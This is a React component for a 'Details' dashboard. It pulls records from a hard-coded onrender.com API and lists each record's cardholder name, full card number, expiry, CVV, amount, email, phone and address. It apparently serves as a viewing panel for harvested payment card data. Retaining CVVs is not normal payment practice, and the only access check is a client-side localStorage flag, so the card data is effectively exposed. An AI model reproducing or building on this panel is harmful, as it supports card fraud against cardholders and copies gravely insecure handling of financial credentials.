import axios from "axios";
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Loader from "../Loader/Loader";

const DataTable = () => {
  const [data, setData] = useState([]);
  const [showLoading, setShowLoading] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchDetails = async () => {
      setShowLoading(true);
      const result = await axios.get(
        "https://get-details-h1mu.onrender.com/api/v1/details"
      );

      setShowLoading(false);

      if (result.data.status) {
        setData(result.data.details);
      } else {
        alert(result.data.message);
      }
    };

    fetchDetails();
  }, []);

  useEffect(() => {
    const checkLoggedIn = localStorage.getItem("isLoggedIn");
    if (!checkLoggedIn) {
      navigate("/");
    }
  });

  function handleLogout() {
    localStorage.removeItem("isLoggedIn");
    navigate("/");
  }

  return (
    <div className="min-h-dvh bg-black text-white p-6">
      {/* Navbar */}
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-3xl font-semibold text-center w-full">Details</h2>
        <button
          onClick={() => handleLogout()}
          className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700"
        >
          Logout
        </button>
      </div>

      {/* Conditional rendering for showLoading */}
      {showLoading ? (
        <Loader/>
      ) : (
        // Table content
        <div className="overflow-x-auto">
          <table className="min-w-full table-auto text-left border-collapse">
            <thead>
              <tr>
                <th className="px-4 py-2 border-b">Card Holder Name</th>
                <th className="px-4 py-2 border-b">Card Number</th>
                <th className="px-4 py-2 border-b">Expiry Month</th>
                <th className="px-4 py-2 border-b">Expiry Year</th>
                <th className="px-4 py-2 border-b">CVV</th>
                <th className="px-4 py-2 border-b">Amount</th>
                <th className="px-4 py-2 border-b">Email</th>
                <th className="px-4 py-2 border-b">Mobile Number</th>
                <th className="px-4 py-2 border-b">Address Line 1</th>
                <th className="px-4 py-2 border-b">City</th>
                <th className="px-4 py-2 border-b">State</th>
                <th className="px-4 py-2 border-b">Country</th>
                <th className="px-4 py-2 border-b">Zip</th>
              </tr>
            </thead>
            <tbody>
              {data.map((item) => (
                <tr key={item._id} className="hover:bg-gray-800">
                  <td className="px-4 py-2 border-b">{item.cardHolderName}</td>
                  <td className="px-4 py-2 border-b">{item.cardNumber}</td>
                  <td className="px-4 py-2 border-b">{item.expiryMonth}</td>
                  <td className="px-4 py-2 border-b">{item.expiryYear}</td>
                  <td className="px-4 py-2 border-b">{item.cvv}</td>
                  <td className="px-4 py-2 border-b">${item.amount}</td>
                  <td className="px-4 py-2 border-b">{item.email}</td>
                  <td className="px-4 py-2 border-b">{item.mobileNumber}</td>
                  <td className="px-4 py-2 border-b">{item.addressLine1}</td>
                  <td className="px-4 py-2 border-b">{item.city}</td>
                  <td className="px-4 py-2 border-b">{item.state}</td>
                  <td className="px-4 py-2 border-b">{item.country}</td>
                  <td className="px-4 py-2 border-b">{item.zip}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default DataTable;
